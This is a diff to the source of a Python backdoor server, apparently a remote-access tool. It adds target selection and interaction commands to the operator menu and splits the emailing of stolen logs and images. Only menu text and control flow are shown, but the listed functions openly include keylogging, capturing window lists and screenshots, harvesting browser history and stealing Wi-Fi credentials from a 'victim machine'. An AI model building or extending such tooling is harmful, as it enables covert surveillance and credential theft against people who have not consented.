@@ -5,6 +5,7 @@ import sys, os
 import threading
 import subprocess
 
+
 """ This module for creating quick backdoors
     servers
     TODO The backdoor uses username and password for protection purposes
@@ -37,8 +38,13 @@ def menu():
   print
   print "[*] refresh        ========= > Refresh the connection" #DONE
   print "[*] list           ========= > Lists all the connected clients" #DONE
+  print "[*] select         ========= > Select a specific target from the connected devices" #DONE
+  print "[*] interact       ========= > Interacts with the device using the below command options" #DONE
+  print
+  print
+  interact()
 
-
+  
 def interact():
 
   """This is the program menu"""
@@ -48,7 +54,8 @@ def interact():
   print "[*] keylog         ========= > Start capturing keystrokes" #DONE
   print "[*] openwins       ========= > Get all the open program windows on the machine" #DONE
   print "[*] capture        ========= > take images of the host machine " #TODO
-  print "[*] sendlogs       ========= > Sending logs and images by email" #DONE
+  print "[*] sendlogs       ========= > Sending logs by email" #DONE
+  print "[*] sendpics       ========= > Sending images by email" #DONE
   print "[*] history        ========= > Gathers all browsers history" #DONE
   print "[*] wifi           ========= > Get Wi-Fi credentials " #DONE
   print "[*] status         ========= > Get the status of the machine on/off" #TODO
@@ -237,7 +244,7 @@ def backdoor_shell():
               print
               banner()
               menu()
-              #interact()
+              interact()
               
          elif (user_command == ":kill"):
               print "[+] Disconnecting from form the victim machine ----------------"
